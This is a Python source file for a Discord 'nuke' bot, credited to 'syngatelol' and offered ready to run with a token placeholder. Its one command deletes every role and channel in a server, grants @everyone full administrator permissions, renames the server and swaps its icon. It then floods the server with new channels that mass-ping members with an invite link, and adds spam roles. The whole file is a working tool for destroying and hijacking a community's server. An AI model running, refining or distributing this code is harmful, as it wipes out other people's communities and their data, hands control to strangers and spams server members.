import discord
from discord.ext import commands
import aiohttp
import random

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(get_colored_text('Bot is ready to wizz made by syngatelol ; syngate'))

@bot.command()
async def wizz(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # Delete all roles
    for role in guild.roles:
        try:
            await role.delete()
            print(get_colored_text(f"{role.name} has been deleted"))
        except:
            print(get_colored_text(f"{role.name} has not been deleted"))

    # Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
            print(get_colored_text(f"{channel.name} has been deleted"))
        except:
            print(get_colored_text(f"{channel.name} has not been deleted"))

    try:
        everyone_role = discord.utils.get(guild.roles, name="@everyone")
        await everyone_role.edit(permissions=discord.Permissions.all())
        print(get_colored_text("I have given everyone admin."))
    except:
        print(get_colored_text("I was unable to give everyone admin."))

    # Change the server name
    try:
        await guild.edit(name="syngatelol wizzed you")
        print(get_colored_text("Server name has been changed."))
    except:
        print(get_colored_text("Server name could not be changed."))

    # Set server icon
    icon_url = "https://cdn.discordapp.com/attachments/1009642927577899049/1126264773462462475/myztery.png"
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as resp:
            with open("server_icon.png", "wb") as icon_file:
                icon_file.write(await resp.read())
    with open("server_icon.png", "rb") as icon_file:
        await guild.edit(icon=icon_file.read())
    print(get_colored_text("Server icon has been changed."))

    # Create new channels and send messages
    for _ in range(100000000000):
        channel = await guild.create_text_channel("syngate was here")
        print(get_colored_text("New channel created."))
        await channel.send("@everyone syngate wizzed this server discord.gg/eviction")
        print(get_colored_text(f"Message sent in {channel.name}"))

    # Create new roles
    for i in range(1, 51):
        role_name = f"Role {i}"
        await guild.create_role(name='syngate wizzed this server')
        print(get_colored_text(f"Role '{role_name}' has been created."))

def get_colored_text(text):
    colors = ["91", "92", "93", "94", "95", "96", "97"]
    color = random.choice(colors)
    return f"\033[1;{color}m{text}\033[0m"

bot.run('token here')
